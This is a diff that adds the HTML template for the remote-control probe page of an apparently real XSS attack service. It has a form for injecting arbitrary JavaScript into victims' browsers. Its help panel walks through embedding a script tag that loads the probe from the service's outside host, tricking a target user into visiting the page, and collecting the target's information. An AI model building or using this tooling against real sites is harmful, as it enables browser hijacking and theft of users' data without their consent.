@@ -1,0 +1,63 @@
+<div class="col-lg-8" id="probe_lbox">
+    <div class="panel panel-default">
+    <div class="panel-heading">REMOTE CONTROL</div>
+    <div class="panel-body">
+        {% if not probe_existed %}
+        <div class="jumbotron" id="probe_tip1">
+            <h1>Create Probe</h1>
+            <form class="form-inline">
+              <div class="form-group">
+                <div class="input-group">
+                  <div class="input-group-addon"><span class="glyphicon glyphicon-console" aria-hidden="true"></span> INPUT THIS STRING: <code>{{pid}}</code> TO</div>
+                  <input type="text" class="form-control" id="probe_tip1_text" placeholder="{{pid}}">
+                  <div class="input-group-addon">.js</div>
+                </div>
+              </div>
+              <button type="submit" class="btn btn-danger" id="probe_tip1_btn">CREATE AN ONE-TIME PROBE</button>
+            </form>
+            <p class="text-danger">
+              <small>DO NOT BE BAD.</small><br />
+              <small>One-time probe means you can just only use one time per day.</small>
+            </p>
+        </div>
+        {% else %}
+        <div class="well alert" id="probe_tip2">
+          <p>
+            <span class="glyphicon glyphicon-console" aria-hidden="true"></span> PROBE LINK: <a href="/probe/{{pid}}.js" target="_blank">{{pid}}.js</a> <span id="probe_status1">{% if probe_live %}<span class="label label-success">ONLINE</span>{% else %}<span class="label label-default">OFFLINE</span>{% endif %}</span> &nbsp;&nbsp;|&nbsp;&nbsp; 
+            <span class="glyphicon glyphicon-console" aria-hidden="true"></span> RESULT LINK: <span id="probe_status2">{% if probe_done %}<a href="/probe/{{pid}}.txt" target="_blank">{{pid}}.txt</a> <span class="label label-success">PROBED DONE</span>{% else %}<span class="label label-warning">WAITING FOR PROBED</span>{% endif %}</span>
+            <code>[All will be automatically deleted at 00:00.]</code>
+          </p>
+        </div>
+        <div class="form-group" id="probe_cmd">
+            <textarea class="form-control" rows="13" id="probe_cmd_text">{{probe_cmd_c|default:'alert("xssor");'}}</textarea>
+            <span class="help-block">Inject your CMD(JavaScript Codz) here.</span>
+            <button type="reset" class="btn btn-default btn-sm" id="probe_cmd_rst">RESET</button>
+            <button type="submit" class="btn btn-danger btn-sm" id="probe_cmd_btn">INJECT YOUR JAVASCRIPT</button>
+        </div>
+        {% endif %}
+    </div>
+    </div>
+</div>
+<div class="col-lg-4" id="probe_rbox">
+    <div class="panel panel-default">
+    <div class="panel-heading">HELP</div>
+    <div class="panel-body">
+        <p><span class="label label-danger">WARNING!!</span></p>
+        <p>DO NOT BE BAD.<br />
+            <code>This Probe, you can just only use one time per day.</code><br />
+            <code>This Probe, just only the most basic Probe:)</code>
+        </p>
+        <p><span class="label label-danger">1ST STAGE</span></p>
+        <p>1. Create Probe.</p>
+        <p>2. Inject "PROBE LINK" to a HTML page, eg:<br />
+            <code>&lt;script/src=&quot;http://xssor.io/probe/wuvwuup.js&quot;&gt;&lt;/script&gt;</code>
+        </p>
+        <p>3. Cheat target user access this HTML page.</p>
+        <p>4. Wait for target user online...</p>
+        <p><span class="label label-danger">2ND STAGE</span></p>
+        <p>*. The "RESULT LINK" is target user info.</p>
+        <p>*. Inject your CMD(JavaScript Codz) to fun more.</p>
+    </div>
+    </div>
+</div>
+
